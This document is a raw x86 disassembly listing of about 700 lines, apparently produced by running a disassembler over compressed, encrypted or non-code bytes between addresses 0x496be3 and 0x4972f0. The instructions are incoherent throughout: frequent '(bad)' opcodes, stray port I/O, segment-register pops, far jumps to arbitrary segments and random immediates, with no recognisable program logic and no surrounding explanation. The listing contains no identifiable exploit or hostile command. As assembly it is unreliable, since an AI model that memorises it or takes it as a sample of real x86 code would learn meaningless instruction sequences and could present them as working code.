  496be3:	arpl   WORD PTR [ebp+0x4252f7b6],ax
  496be9:	add    al,0x87
  496beb:	(bad)  
  496bec:	shl    edi,1
  496bee:	aas    
  496bef:	add    cl,BYTE PTR [ecx+0x21]
  496bf2:	test   al,0x86
  496bf4:	inc    esi
  496bf5:	or     BYTE PTR [ebx+0x5d796c8],ch
  496bfb:	xor    esi,DWORD PTR [eax-0x343068d2]
  496c01:	ret    0xc3d5
  496c04:	xor    eax,0x4e928f03
  496c09:	dec    ecx
  496c0a:	sub    DWORD PTR [edi+0x392b441e],0x14
  496c11:	xchg   ebp,eax
  496c12:	(bad)  
  496c13:	inc    edx
  496c14:	fisttp QWORD PTR [edx-0x2878ef53]
  496c1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  496c1b:	cdq    
  496c1c:	sbb    ch,BYTE PTR [eax+0x1f31d7a3]
  496c22:	inc    esp
  496c23:	xchg   esp,eax
  496c24:	mov    eax,0xe7bf17a9
  496c29:	adc    dl,al
  496c2b:	push   ss
  496c2c:	xchg   DWORD PTR [edi+0x4026acdf],ebp
  496c32:	sub    edi,DWORD PTR [edi+0x1be4b4df]
  496c38:	sub    edi,esi
  496c3a:	xor    al,BYTE PTR [eax]
  496c3c:	inc    esi
  496c3d:	inc    esp
  496c3e:	mov    ds:0x7973760,eax
  496c43:	outs   dx,DWORD PTR ds:[esi]
  496c44:	fwait
  496c45:	mov    eax,ds:0x3467a88b
  496c4a:	out    dx,eax
  496c4b:	lods   al,BYTE PTR ds:[esi]
  496c4c:	sbb    BYTE PTR [edi],al
  496c4e:	add    eax,0x6a7331f
  496c53:	mov    ah,0x3a
  496c55:	jbe    0x496c12
  496c57:	mov    edi,0x854891ad
  496c5c:	out    0x5f,eax
  496c5e:	mov    ah,0x46
  496c60:	bound  ebx,QWORD PTR [ebx+0x37bf37f3]
  496c66:	pop    es
  496c67:	fldenv [eax-0x5e]
  496c6a:	out    dx,eax
  496c6b:	push   ebx
  496c6c:	and    eax,DWORD PTR ds:0xdf59b130
  496c72:	(bad)  
  496c73:	fcmovb st,st(4)
  496c75:	sub    cl,BYTE PTR [eax-0x51]
  496c78:	gs loope 0x496cdb
  496c7b:	adc    eax,0x68421b57
  496c80:	and    edx,esi
  496c82:	dec    edi
  496c83:	mov    edi,0x48ab1057
  496c88:	les    ebx,FWORD PTR [edi+0x4dc563a4]
  496c8e:	inc    edi
  496c8f:	pop    ds
  496c90:	dec    ebx
  496c91:	test   eax,0xd79a78d1
  496c96:	loope  0x496d02
  496c98:	lds    ecx,FWORD PTR [eax]
  496c9a:	aaa    
  496c9b:	shl    DWORD PTR [ebx+eax*8-0x4074b226],cl
  496ca2:	adc    dl,0xaa
  496ca5:	sub    eax,0x444a52b7
  496caa:	stos   DWORD PTR es:[edi],eax
  496cab:	ja     0x838cde83
  496cb1:	dec    DWORD PTR [edi-0x6d9294be]
  496cb7:	push   cs
  496cb8:	xchg   edi,eax
  496cb9:	cmp    DWORD PTR [ebx+0x27],eax
  496cbc:	add    ebx,edx
  496cbe:	push   esi
  496cbf:	lods   eax,DWORD PTR ds:[esi]
  496cc0:	mov    edi,0xa843778f
  496cc5:	es jbe 0x496c6d
  496cc8:	aaa    
  496cc9:	inc    edi
  496cca:	mov    bh,0x90
  496ccc:	(bad)  
  496ccd:	dec    eax
  496cce:	bound  esi,QWORD PTR [edi+edi*2]
  496cd1:	cli    
  496cd2:	mov    eax,0x9fc7ea46
  496cd7:	out    0xd0,eax
  496cd9:	or     al,0xe1
  496cdb:	dec    eax
  496cdc:	retf   
  496cdd:	xchg   ebp,ebx
  496cdf:	xchg   esp,eax
  496ce0:	inc    esi
  496ce1:	lods   eax,DWORD PTR ds:[esi]
  496ce2:	out    0x5f,eax
  496ce4:	cs test al,0x61
  496ce7:	pusha  
  496ce8:	xlat   BYTE PTR ds:[ebx]
  496ce9:	cmp    bl,al
  496ceb:	pop    edx
  496cec:	inc    ebp
  496ced:	or     esi,DWORD PTR [edi]
  496cef:	daa    
  496cf0:	leave  
  496cf1:	xor    eax,0xffcf66ac
  496cf6:	xor    al,0x80
  496cf8:	cmp    al,0x80
  496cfa:	push   ss
  496cfb:	pop    ss
  496cfc:	cmp    al,cl
  496cfe:	ret    
  496cff:	loop   0x496cd5
  496d01:	xor    eax,0x38feef
  496d06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  496d07:	(bad)  
  496d08:	push   es
  496d09:	xlat   BYTE PTR ds:[ebx]
  496d0a:	mov    eax,ds:0xf897ac3
  496d0f:	xchg   edi,eax
  496d10:	ja     0x496d32
  496d12:	xchg   edi,eax
  496d13:	or     ah,BYTE PTR [eax+0x5003df37]
  496d19:	dec    edx
  496d1a:	outs   dx,BYTE PTR ds:[esi]
  496d1b:	and    dl,BYTE PTR [edi+0x1046a233]
  496d21:	pop    edx
  496d22:	ja     0x496d78
  496d24:	sub    BYTE PTR [eax],bl
  496d26:	adc    al,0x4f
  496d28:	xlat   BYTE PTR ds:[ebx]
  496d29:	leave  
  496d2a:	push   eax
  496d2b:	add    BYTE PTR ds:0xe36d7c7,0x1
  496d32:	add    DWORD PTR [edx+0x5561ffbf],0x583fb184
  496d3c:	adc    DWORD PTR [eax-0x5f],esi
  496d3f:	dec    edi
  496d40:	xchg   BYTE PTR [edi+0x40],bl
  496d43:	sub    al,BYTE PTR [ebx+0xc]
  496d46:	pop    es
  496d47:	inc    edx
  496d48:	xor    DWORD PTR [edi+0x35],ebp
  496d4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  496d4c:	fs ss inc edi
  496d4f:	dec    edi
  496d50:	ror    BYTE PTR [ebx+ecx*4],cl
  496d53:	add    eax,DWORD PTR [edi]
  496d55:	push   DWORD PTR [eax]
  496d57:	push   ebp
  496d58:	retf   0xcd5a
  496d5b:	movq   mm0,QWORD PTR [ecx+0x28]
  496d5f:	mov    ds:0xac1f6785,al
  496d64:	mov    DWORD PTR [esi],eax
  496d66:	inc    edx
  496d67:	outs   dx,DWORD PTR ds:[esi]
  496d68:	stos   BYTE PTR es:[edi],al
  496d69:	dec    ecx
  496d6a:	push   0xb53f1f15
  496d6f:	mov    BYTE PTR [ebp+0x4],ah
  496d72:	(bad)  
  496d73:	fnstcw WORD PTR [eax]
  496d75:	sar    BYTE PTR [edx-0x28dc70c9],1
  496d7b:	and    ecx,ebp
  496d7d:	xchg   edi,eax
  496d7e:	das    
  496d7f:	inc    ecx
  496d80:	xor    al,0xd4
  496d82:	mov    WORD PTR [ebp+0x4bf73734],ss
  496d88:	call   0x6043:0x76bfa1d6
  496d8f:	int    0x48
  496d91:	or     eax,0xe329afbf
  496d96:	or     cl,BYTE PTR [ecx+0x1f]
  496d99:	xor    BYTE PTR [edx],ah
  496d9b:	jno    0x496dfd
  496d9d:	rcr    BYTE PTR [esi],cl
  496d9f:	xor    dl,BYTE PTR [edi-0x5b]
  496da2:	shl    DWORD PTR ds:0x1677c33d,0xa
  496da9:	pop    eax
  496daa:	xchg   DWORD PTR [edi],ebx
  496dac:	aas    
  496dad:	push   ebp
  496dae:	or     BYTE PTR [edx],bl
  496db0:	xchg   ebp,eax
  496db1:	out    dx,eax
  496db2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  496db3:	sbb    eax,DWORD PTR [esi]
  496db5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  496db6:	xor    bh,0xd7
  496db9:	and    DWORD PTR [eax+ecx*1+0x19],eax
  496dbd:	pop    ss
  496dbe:	and    BYTE PTR [edx+0x676f31a5],dl
  496dc4:	sub    al,0xd6
  496dc6:	cs ret 
  496dc8:	sbb    esp,DWORD PTR [edx+0x48422217]
  496dce:	mov    ch,0x4
  496dd0:	mov    es,WORD PTR [ebp+0x53]
  496dd3:	inc    edi
  496dd4:	ret    
  496dd5:	retf   
  496dd6:	xlat   BYTE PTR ds:[ebx]
  496dd7:	push   edi
  496dd8:	lahf   
  496dd9:	inc    esi
  496dda:	adc    ecx,edx
  496ddc:	shr    BYTE PTR [ecx],1
  496dde:	xlat   BYTE PTR ds:[ebx]
  496ddf:	inc    edx
  496de0:	out    0xd3,eax
  496de2:	ret    0xbbc1
  496de5:	xchg   edx,eax
  496de6:	iret   
  496de7:	out    0x9b,eax
  496de9:	jno    0x496da0
  496deb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  496dec:	pop    ss
  496ded:	pop    ss
  496dee:	pop    ds
  496def:	lahf   
  496df0:	popa   
  496df1:	adc    BYTE PTR [ebp+0x5a],0xef
  496df5:	pop    ebx
  496df6:	push   edx
  496df7:	dec    edx
  496df8:	scas   al,BYTE PTR es:[edi]
  496df9:	xor    dl,bh
  496dfb:	aaa    
  496dfc:	push   esp
  496dfd:	mov    ch,0xad
  496dff:	or     bh,0x27
  496e02:	fbld   TBYTE PTR [edx-0x18e56570]
  496e08:	fadd   DWORD PTR [eax+0x8]
  496e0b:	test   eax,0x13163486
  496e10:	add    al,0xac
  496e12:	pop    ss
  496e13:	mov    edi,0xa9152e4
  496e18:	out    dx,eax
  496e19:	pop    ss
  496e1a:	add    ebp,DWORD PTR [eax-0x63]
  496e1d:	pop    eax
  496e1e:	xchg   edi,eax
  496e1f:	ja     0x496e58
  496e21:	add    ch,BYTE PTR [esi+eax*8]
  496e24:	push   cs
  496e25:	mov    ds:0xde1acf8f,eax
  496e2a:	sub    ch,BYTE PTR [edi+ebx*4+0xd56277b]
  496e31:	xchg   esp,eax
  496e32:	mov    ah,0x5f
  496e34:	outs   dx,BYTE PTR ds:[esi]
  496e35:	add    DWORD PTR [edx],edi
  496e37:	or     BYTE PTR [edi],bl
  496e39:	inc    esi
  496e3a:	ja     0x496e40
  496e3c:	fwait
  496e3d:	ins    DWORD PTR es:[edi],dx
  496e3e:	test   BYTE PTR [edi+0x2ad00ef],cl
  496e44:	adc    dh,BYTE PTR [edi]
  496e46:	inc    ebx
  496e47:	test   BYTE PTR [esi-0x5b],al
  496e4a:	mov    tr4,esp
  496e4d:	add    esp,DWORD PTR [ebx+0x3235b61f]
  496e53:	xchg   esp,eax
  496e54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  496e55:	add    eax,0x15a7f71b
  496e5a:	adc    BYTE PTR [edx-0x5e],0xd7
  496e5e:	pop    ss
  496e5f:	inc    edx
  496e60:	cmp    ch,BYTE PTR [ebp+0x23]
  496e63:	xchg   esi,eax
  496e64:	sub    BYTE PTR ss:[ebx-0x5d],cl
  496e68:	inc    edx
  496e69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  496e6a:	sub    DWORD PTR [edx],eax
  496e6c:	and    DWORD PTR [ecx+0x47],edi
  496e6f:	inc    edx
  496e70:	push   esi
  496e71:	aaa    
  496e72:	test   DWORD PTR [ecx+0x4f],eax
  496e75:	das    
  496e76:	stc    
  496e77:	mov    ch,0x1
  496e79:	fcomp  DWORD PTR [ebx]
  496e7b:	jae    0x496ed4
  496e7d:	aaa    
  496e7e:	rcr    dl,cl
  496e80:	lds    eax,FWORD PTR [edx]
  496e82:	sbb    ebx,DWORD PTR [edi+0x23]
  496e85:	mov    ah,0x55
  496e87:	or     DWORD PTR [edi],ebp
  496e89:	aaa    
  496e8a:	test   BYTE PTR [ecx-0x593fa8],ah
  496e90:	xor    al,0xd5
  496e92:	push   es
  496e93:	adc    dh,BYTE PTR [ebx-0x2c7558c9]
  496e99:	add    BYTE PTR [esi],dl
  496e9b:	cpuid  
  496e9d:	mov    ah,0x8d
  496e9f:	lds    eax,FWORD PTR [edx+0x49ae41ef]
  496ea5:	push   esp
  496ea6:	mov    edi,0xb4545241
  496eab:	jno    0x496edb
  496ead:	out    0x50,eax
  496eaf:	adc    DWORD PTR [ebx+0x538a7790],0xffffffd4
  496eb6:	mov    ds:0xa421af0f,al
  496ebb:	xchg   ecx,eax
  496ebc:	push   esp
  496ebd:	xchg   esi,eax
  496ebe:	xor    DWORD PTR [eax-0x30be74fc],eax
  496ec4:	ja     0x496ec6
  496ec6:	inc    edx
  496ec7:	mov    bh,0x75
  496ec9:	(bad)  
  496eca:	ja     0x496e6a
  496ecc:	push   ebx
  496ecd:	bound  edx,QWORD PTR [edi]
  496ecf:	xchg   DWORD PTR [edi],ebp
  496ed1:	sti    
  496ed2:	das    
  496ed3:	sbb    DWORD PTR [edx+0x44],eax
  496ed6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  496ed7:	outs   dx,DWORD PTR ds:[esi]
  496ed8:	pop    ss
  496ed9:	mov    ecx,0x971da550
  496ede:	pandn  mm1,QWORD PTR [eax+0xf2ac16a]
  496ee5:	pop    es
  496ee6:	out    0xe1,eax
  496ee8:	pop    ecx
  496ee9:	imul   eax,edx,0x1f
  496eec:	pop    edi
  496eed:	pop    es
  496eee:	mov    WORD PTR [edi-0x54],fs
  496ef1:	pop    edi
  496ef2:	mov    ds:0x80c1afe7,eax
  496ef7:	adc    al,0xe7
  496ef9:	jb     0x496f51
  496efb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  496efc:	adc    ebx,DWORD PTR ss:[edi+0x17]
  496f00:	mov    edx,0xcf006c4d
  496f05:	xchg   edi,eax
  496f06:	test   eax,0xcf10da59
  496f0b:	pop    es
  496f0c:	and    eax,0xf052e8f
  496f11:	outs   dx,BYTE PTR ds:[esi]
  496f12:	push   edi
  496f13:	xor    DWORD PTR [esi+edx*2+0x58ff6204],eax
  496f1a:	rol    DWORD PTR [edx+0x42f3f12],cl
  496f20:	mov    ah,0x26
  496f22:	xchg   ebx,eax
  496f23:	addr16 mov al,0x74
  496f26:	dec    eax
  496f27:	pop    ebp
  496f28:	addr16 ja 0x496f63
  496f2b:	lods   eax,DWORD PTR ds:[esi]
  496f2c:	pusha  
  496f2d:	int    0x84
  496f2f:	jg     0x496f18
  496f31:	mov    ah,0x42
  496f33:	pop    ss
  496f34:	and    al,0x47
  496f36:	adc    edx,DWORD PTR [esi+0x27]
  496f39:	xor    edx,edx
  496f3b:	daa    
  496f3c:	ja     0x496f37
  496f3e:	inc    esi
  496f3f:	sub    al,BYTE PTR [esi]
  496f41:	pop    ss
  496f42:	jbe    0x496f77
  496f44:	(bad)  
  496f45:	dec    esi
  496f46:	lods   al,BYTE PTR ds:[esi]
  496f47:	and    eax,0x2b5d37ff
  496f4c:	jne    0x496ee7
  496f4e:	scas   eax,DWORD PTR es:[edi]
  496f4f:	rcl    ecx,cl
  496f51:	adc    eax,0x67af542b
  496f56:	inc    ebp
  496f57:	das    
  496f58:	popa   
  496f59:	jecxz  0x496f6e
  496f5b:	pop    eax
  496f5c:	adc    ebx,DWORD PTR [eax-0x6f]
  496f5f:	xor    BYTE PTR [eax],bh
  496f61:	pop    ss
  496f62:	fisttp WORD PTR [eax-0x75]
  496f65:	sub    al,BYTE PTR [eax-0x1]
  496f68:	bound  esi,QWORD PTR [esi+ebp*2]
  496f6b:	jo     0x496fa8
  496f6d:	mov    ds:0x166e24df,al
  496f72:	adc    BYTE PTR [ebx+0x4c842945],bh
  496f78:	pop    esp
  496f79:	push   edi
  496f7a:	xor    DWORD PTR [esi+eax*8-0x5008ae80],esi
  496f81:	lea    edx,[ecx-0x5d]
  496f84:	cdq    
  496f85:	out    dx,eax
  496f86:	xlat   BYTE PTR ds:[ebx]
  496f87:	push   ebp
  496f88:	adc    dl,BYTE PTR [eax-0x78]
  496f8b:	scas   eax,DWORD PTR es:[edi]
  496f8c:	pop    es
  496f8d:	mov    ds:0xae61c23a,al
  496f92:	sti    
  496f93:	mov    ecx,0x97b0275b
  496f99:	xchg   edi,edi
  496f9b:	sub    edx,DWORD PTR [eax+eax*4+0x55]
  496f9f:	pop    ds
  496fa0:	shl    BYTE PTR [ebp+0x69],1
  496fa3:	adc    BYTE PTR [edi],dh
  496fa5:	(bad)  
  496fa6:	cmp    DWORD PTR [ebx],ebp
  496fa8:	test   BYTE PTR [eax],dl
  496faa:	stos   BYTE PTR es:[edi],al
  496fab:	xlat   BYTE PTR ds:[ebx]
  496fac:	inc    DWORD PTR [ebp+0x776b4a0f]
  496fb2:	mov    bl,0x32
  496fb4:	ficom  WORD PTR [ecx+eiz*1]
  496fb7:	out    0x33,eax
  496fb9:	daa    
  496fba:	inc    esi
  496fbb:	push   0x17a72b03
  496fc0:	adc    BYTE PTR [edi],dl
  496fc2:	or     al,0x86
  496fc4:	jg     0x496ff9
  496fc6:	rcl    BYTE PTR [ecx-0x50],0x2
  496fca:	push   edi
  496fcb:	pop    es
  496fcc:	xor    edx,DWORD PTR [ebp-0x40]
  496fcf:	in     al,0x20
  496fd1:	(bad)  
  496fd2:	cmp    BYTE PTR [ebx-0x2a],dh
  496fd5:	push   0xffffff90
  496fd7:	adc    BYTE PTR [edi+0xd],0x48
  496fdb:	jb     0x49702a
  496fdd:	lahf   
  496fde:	xor    edx,DWORD PTR [edi-0x7b]
  496fe1:	xchg   BYTE PTR [ebp+0x5a],cl
  496fe4:	pop    ss
  496fe5:	(bad)  
  496fe6:	mov    esp,0x2766b0b2
  496feb:	inc    edi
  496fec:	aaa    
  496fed:	add    ebx,ebp
  496fef:	(bad)  
  496ff0:	nop
  496ff1:	inc    ebx
  496ff2:	pop    ds
  496ff3:	adc    BYTE PTR [edx],cl
  496ff5:	and    BYTE PTR [ecx+0x6e47335f],0x71
  496ffc:	push   0x27
  496ffe:	jmp    DWORD PTR [edi-0x72f7f4d2]
  497004:	ss iret 
  497006:	rol    esp,0x2a
  497009:	lods   eax,DWORD PTR ds:[esi]
  49700a:	ja     0x497083
  49700c:	sub    DWORD PTR [eax],edi
  49700e:	popa   
  49700f:	push   ebp
  497010:	(bad)  
  497011:	jp     0x496fd2
  497013:	fwait
  497014:	adc    BYTE PTR [eax-0x5b],0x31
  497018:	mov    bh,0xb7
  49701a:	inc    ecx
  49701b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49701c:	push   ebp
  49701d:	ins    DWORD PTR es:[edi],dx
  49701e:	inc    edi
  49701f:	aas    
  497020:	(bad)  
  497021:	mov    WORD PTR [edx+0x40],gs
  497024:	retf   0x6732
  497027:	push   eax
  497028:	pop    eax
  497029:	mov    ds:0xd6cf48,eax
  49702e:	sub    al,0x42
  497030:	pop    ds
  497031:	scas   eax,DWORD PTR es:[edi]
  497032:	inc    ebp
  497033:	in     eax,dx
  497034:	aam    0x1a
  497036:	dec    edi
  497037:	aaa    
  497038:	push   ecx
  497039:	xor    al,0x99
  49703b:	sub    dh,BYTE PTR [edi+0x31247739]
  497041:	sub    ch,BYTE PTR [eax-0x61]
  497044:	or     ebx,DWORD PTR [edx]
  497046:	pusha  
  497047:	stos   DWORD PTR es:[edi],eax
  497048:	inc    edi
  497049:	push   edi
  49704a:	xor    ebp,DWORD PTR [edx+0x1c]
  49704d:	or     BYTE PTR [ecx],dl
  49704f:	xlat   BYTE PTR ds:[ebx]
  497050:	pop    ss
  497051:	les    eax,FWORD PTR [esi]
  497053:	mov    cl,0x66
  497055:	pop    ds
  497056:	test   ebx,0xd758445a
  49705c:	ret    0xc222
  49705f:	push   es
  497060:	sti    
  497061:	xlat   BYTE PTR ds:[ebx]
  497062:	scas   al,BYTE PTR es:[edi]
  497063:	dec    ebx
  497064:	mov    edx,ecx
  497066:	iret   
  497067:	dec    edi
  497068:	inc    ebx
  497069:	mov    edx,0xbf4953f4
  49706e:	xor    esp,DWORD PTR [edi]
  497070:	or     BYTE PTR [ebp+0x2a77b034],dl
  497076:	dec    esp
  497077:	lea    edx,[eax+0x6e259fbb]
  49707d:	call   0x115:0x8e173338
  497084:	and    BYTE PTR [edi-0x21],ch
  497087:	sbb    edx,eax
  497089:	arpl   WORD PTR [edi+edx*4+0xc5a5537],sp
  497090:	stos   DWORD PTR es:[edi],eax
  497091:	pop    ss
  497092:	xchg   DWORD PTR [edi-0x2b],ebp
  497095:	daa    
  497096:	adc    cl,al
  497098:	cmp    bh,cl
  49709a:	fild   WORD PTR [ebp+0x310c21b8]
  4970a0:	xchg   DWORD PTR [eax],edi
  4970a2:	or     cl,cl
  4970a4:	inc    ebx
  4970a5:	(bad)  
  4970a7:	cmovne ebx,DWORD PTR [eax-0x57]
  4970ab:	add    bl,bh
  4970ad:	xchg   esp,eax
  4970ae:	xchg   ecx,eax
  4970af:	or     BYTE PTR [esi+0x6f],al
  4970b2:	aaa    
  4970b3:	push   0x1ffa9174
  4970b8:	aaa    
  4970b9:	inc    esi
  4970ba:	pop    es
  4970bb:	and    DWORD PTR [edi+ebx*2+0x77],ebx
  4970bf:	pop    ss
  4970c0:	mov    al,ds:0x77ee81b5
  4970c5:	xchg   ebx,eax
  4970c6:	jo     0x497049
  4970c8:	add    ah,BYTE PTR [eax+0x17]
  4970cb:	xchg   DWORD PTR ss:[esp+ebp*2-0x50],esp
  4970d0:	out    0xbf,eax
  4970d2:	inc    ebp
  4970d3:	rol    BYTE PTR [edx+0x75ffe710],cl
  4970d9:	pop    edx
  4970da:	(bad)  [esi-0x5400a0a5]
  4970e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4970e1:	add    DWORD PTR [eax+0x54ba419f],0x6abf1324
  4970eb:	inc    ebp
  4970ec:	and    al,0x4e
  4970ee:	dec    ecx
  4970ef:	out    dx,eax
  4970f0:	xchg   esi,eax
  4970f1:	cs jmp 0x49712e
  4970f4:	xlat   BYTE PTR ds:[ebx]
  4970f5:	cmp    bh,ah
  4970f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4970f8:	mov    BYTE PTR [edx+eiz*2+0xb6fa7a4],dh
  4970ff:	push   esi
  497100:	inc    ebx
  497101:	adc    DWORD PTR [edi+0x6d56951f],0x0
  497108:	push   edi
  497109:	jg     0x497097
  49710b:	dec    ebx
  49710c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49710d:	inc    edx
  49710e:	aas    
  49710f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  497110:	inc    ecx
  497111:	adc    eax,0x126b8724
  497116:	add    DWORD PTR [ecx-0x61],0xad46807
  49711d:	inc    ecx
  49711e:	pop    es
  49711f:	xlat   BYTE PTR ds:[ebx]
  497120:	stos   BYTE PTR es:[edi],al
  497121:	hlt    
  497122:	or     esp,esi
  497124:	inc    ecx
  497125:	xlat   BYTE PTR ds:[ebx]
  497126:	inc    esp
  497127:	outs   dx,DWORD PTR ds:[esi]
  497128:	bound  eax,QWORD PTR [ecx+0x4a]
  49712b:	xchg   BYTE PTR [esi],dh
  49712d:	lahf   
  49712e:	xor    DWORD PTR [esi],edi
  497130:	adc    BYTE PTR [edi+eax*4],0xcb
  497134:	ja     0x497167
  497136:	push   esi
  497137:	cmc    
  497138:	push   esi
  497139:	das    
  49713a:	lahf   
  49713b:	aas    
  49713c:	xchg   esi,eax
  49713d:	push   ss
  49713e:	rcl    DWORD PTR ds:0x4d681f36,1
  497144:	stos   DWORD PTR es:[edi],eax
  497145:	nop
  497146:	pop    edi
  497147:	xchg   DWORD PTR [ecx],eax
  497149:	and    esp,DWORD PTR [esi-0x614830cb]
  49714f:	popa   
  497150:	lods   al,BYTE PTR ds:[esi]
  497151:	and    dl,BYTE PTR [edi-0x7d]
  497154:	dec    ebx
  497155:	xchg   edi,eax
  497156:	in     al,0x13
  497158:	xchg   edi,eax
  497159:	inc    ecx
  49715a:	jmp    0x3807:0xa064918a
  497161:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  497162:	dec    ebp
  497163:	sub    DWORD PTR [esi],edi
  497165:	mov    al,0xa7
  497167:	dec    ebx
  497168:	mov    bh,0x68
  49716a:	fisub  DWORD PTR [eax]
  49716c:	push   0xc032b78b
  497171:	mov    ch,0xe4
  497173:	xor    BYTE PTR [edi-0x274bc9d0],dh
  497179:	adc    eax,0xec05c734
  49717e:	shr    dl,0xcf
  497181:	(bad)  
  497182:	fnstsw WORD PTR [eax+0x4a579745]
  497188:	scas   eax,DWORD PTR es:[edi]
  497189:	pop    ebx
  49718a:	xchg   ecx,eax
  49718b:	cmc    
  49718c:	adc    cl,bh
  49718e:	scas   eax,DWORD PTR es:[edi]
  49718f:	push   es
  497190:	push   eax
  497191:	push   edi
  497192:	push   ebx
  497193:	retf   
  497194:	xor    al,0x6f
  497196:	inc    edx
  497197:	sub    DWORD PTR ds:0x172766a4,edx
  49719d:	lods   eax,DWORD PTR ds:[esi]
  49719e:	mov    dh,0x2a
  4971a0:	loopne 0x4971e9
  4971a2:	aaa    
  4971a3:	inc    edi
  4971a4:	aad    0x71
  4971a6:	push   ebp
  4971a7:	lods   al,BYTE PTR ds:[esi]
  4971a8:	out    0xe7,eax
  4971aa:	inc    edx
  4971ab:	dec    edi
  4971ac:	lods   al,BYTE PTR ds:[esi]
  4971ad:	test   eax,0x9f32d65a
  4971b2:	inc    ebx
  4971b3:	clc    
  4971b4:	test   DWORD PTR [ecx+edx*4],edx
  4971b7:	fisttp WORD PTR [edi]
  4971b9:	inc    esp
  4971ba:	or     esp,DWORD PTR [ecx]
  4971bc:	or     cl,cl
  4971be:	pop    es
  4971bf:	je     0x497143
  4971c1:	ror    BYTE PTR [esi],cl
  4971c3:	aaa    
  4971c4:	xchg   DWORD PTR [eax],edx
  4971c6:	je     0x497225
  4971c8:	pop    edx
  4971c9:	daa    
  4971ca:	xor    al,0xb0
  4971cc:	push   0xc7676a42
  4971d1:	and    al,0x97
  4971d3:	and    ah,0x77
  4971d6:	(bad)  
  4971d7:	cmp    BYTE PTR [edx],bl
  4971d9:	dec    ecx
  4971da:	lods   al,BYTE PTR ds:[esi]
  4971db:	and    bh,0x4f
  4971de:	pop    eax
  4971df:	mov    al,ds:0x675f56dd
  4971e4:	xor    edx,ebp
  4971e6:	imul   esi,DWORD PTR [ebx-0x701888fd],0xffffffdc
  4971ed:	xor    dl,BYTE PTR [ecx+0x2b9f37aa]
  4971f3:	push   edx
  4971f4:	test   al,0x18
  4971f6:	(bad)  
  4971f7:	fistp  WORD PTR [ecx+0x9]
  4971fa:	sbb    DWORD PTR [eax-0x71cfbad0],edx
  497200:	mov    WORD PTR ds:0x95647d7,ss
  497206:	push   0x45
  497208:	xchg   edi,eax
  497209:	fist   WORD PTR [esi]
  49720b:	xor    edx,DWORD PTR [esi]
  49720d:	adc    ebp,DWORD PTR [edi+0x27]
  497210:	stos   DWORD PTR es:[edi],eax
  497211:	adc    DWORD PTR [edx-0x7f9898f2],eax
  497217:	dec    eax
  497218:	adc    DWORD PTR [edx],eax
  49721a:	lahf   
  49721b:	and    BYTE PTR [esi],0xba
  49721e:	icebp  
  49721f:	sbb    esi,DWORD PTR [edi]
  497221:	mov    bh,0x45
  497223:	sub    al,BYTE PTR [esi-0x78]
  497226:	dec    eax
  497227:	inc    edi
  497228:	out    0x8,eax
  49722a:	push   ds
  49722b:	push   esi
  49722c:	ror    edi,0x2b
  49722f:	iret   
  497230:	lds    eax,FWORD PTR [eax+0x7f361934]
  497236:	adc    BYTE PTR ds:0x1b175813,0x14
  49723d:	pusha  
  49723e:	push   ebp
  49723f:	inc    edi
  497240:	out    dx,eax
  497241:	ret    
  497242:	mov    ds:0xb396cdad,eax
  497247:	daa    
  497248:	enter  0xbc71,0x56
  49724c:	inc    edx
  49724d:	push   edi
  49724e:	inc    esp
  49724f:	scas   al,BYTE PTR es:[edi]
  497250:	mov    al,ds:0x67441725
  497255:	mov    BYTE PTR [ebx],bl
  497257:	frstor [eax-0x646f21c9]
  49725d:	adc    DWORD PTR [edx],ecx
  49725f:	imul   DWORD PTR [edi+0x44]
  497262:	sub    DWORD PTR ds:0x23419863,eax
  497268:	aaa    
  497269:	(bad)  [esi+0x13]
  49726c:	mov    eax,ds:0x6d462777
  497271:	add    eax,0x4a9f252a
  497276:	sbb    BYTE PTR [esi+0x44cf0f55],ch
  49727c:	sbb    ebp,DWORD PTR [ebp+0x5c]
  49727f:	adc    BYTE PTR [edi+0x6a],0x1f
  497283:	jmp    0x49723b
  497285:	mov    cl,0x5b
  497287:	dec    edi
  497288:	dec    edi
  497289:	push   eax
  49728a:	or     ch,BYTE PTR [ecx-0x6e6880af]
  497290:	push   ss
  497291:	enter  0x6368,0x4f
  497295:	out    0x8c,eax
  497297:	or     al,BYTE PTR [ebp+0x42e737e4]
  49729d:	in     al,dx
  49729e:	and    dl,BYTE PTR [edx-0x19]
  4972a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4972a2:	lahf   
  4972a3:	sub    BYTE PTR [eax],cl
  4972a5:	or     DWORD PTR [ecx-0x7a8ee7bc],edi
  4972ab:	aad    0x77
  4972ad:	pop    ss
  4972ae:	pop    ss
  4972af:	mov    WORD PTR [esp+ecx*4],ss
  4972b2:	loop   0x4972f9
  4972b4:	or     ebp,DWORD PTR [edi-0x2e]
  4972b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4972b8:	add    DWORD PTR [esi-0x59],edx
  4972bb:	out    0x44,eax
  4972bd:	mov    al,0x8
  4972bf:	mov    ch,0xd0
  4972c1:	fild   WORD PTR [edi]
  4972c3:	push   ecx
  4972c4:	or     BYTE PTR ds:0x279f271b,0x40
  4972cb:	push   0x97478ed1
  4972d0:	and    BYTE PTR [ebp+ecx*1-0x48],dl
  4972d4:	iret   
  4972d5:	iret   
  4972d6:	inc    esi
  4972d7:	dec    esp
  4972d8:	mov    esi,DWORD PTR [edi+eax*1+0x6a11a79f]
  4972df:	lds    edx,FWORD PTR [eax]
  4972e1:	das    
  4972e2:	aaa    
  4972e3:	lea    esi,[ecx+esi*4+0xd76f60]
  4972ea:	xchg   esi,eax
  4972eb:	sbb    al,0x6c
  4972ed:	inc    edi
  4972ee:	cmp    BYTE PTR [edx],ah
  4972f0:	pusha  
